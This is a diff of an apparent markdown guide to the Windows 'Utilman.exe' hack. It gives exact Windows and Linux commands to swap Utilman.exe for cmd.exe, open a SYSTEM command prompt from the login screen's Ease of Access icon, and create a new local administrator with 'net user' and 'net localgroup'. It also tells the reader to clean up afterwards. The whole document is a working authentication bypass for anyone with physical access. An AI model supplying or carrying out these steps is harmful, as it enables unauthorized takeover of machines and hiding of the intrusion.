@@ -28,10 +28,18 @@ This quick-and-dirty little hack allows a user to get an Administration/System-L
           - `move C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.exe.backup`
      - If this is a Linux Live Distro:
           - `mv /mnt/harddrive/Windows/System32/Utilman.exe /mnt/harddrive/Windows/System32/Utilman.exe.backup`
-3. Copy C:\Windows\System32\cmd.exe to C:\Windows\System32\Utilman.exe
+3. Copy cmd.exe as Utilman.exe in the system32 folder
+     - If this is Windows 10 Recovery Media:
+          - `copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe`
+     - If this is a Linux Live Distro:
+          - `cp /mnt/harddrive/Windows/System32/cmd.exe /mnt/harddrive/Windows/System32/Utilman.exe`
 4. Reboot the computer and remove the boot media just used.
 5. When the Login Screen appears - click on the Ease of Access icon in the bottom right-hand corner
-6. Create a user for yourself on the command prompt
+     - YOU NOW HAVE AN ADMIN COMMAND PROMPT!
+6. Create a user for yourself on the command prompt.
+     - `net user <username> <password> /add`
+     - `net localgroup administrators <username> /add`
+     - 
 7. Log into Windows using the username just created.
 8. Add the user account that doesn't have Admin access to the Administrators local group
 9. Clean up after yourself! 
@@ -39,14 +47,8 @@ This quick-and-dirty little hack allows a user to get an Administration/System-L
 11. Clean up after yourself some more!
 
 
-
-2 - Move C:\Windows\System32\Utilman.exe to a safe location because we're going to over write it. (C:\)
-3 - Copy C:\Windows\System32\cmd.exe to C:\Windows\System32\Utilman.exe.
-4 - Reboot the computer. 
-5 - When the login menu appears, click the ease of access icon on the bottom right.  A root shell will appear.
-6 - Create a user for yourself on the command prompt:
-    a - net user <username> <password> /add
-    b - net localgroup administrators <username> /add
+    a - 
+    b - 
     c - close command prompt
 7 - Log in to windows using the username and password just created
 8 - Add the useraccounts needed to the administrator group using commands from step 6
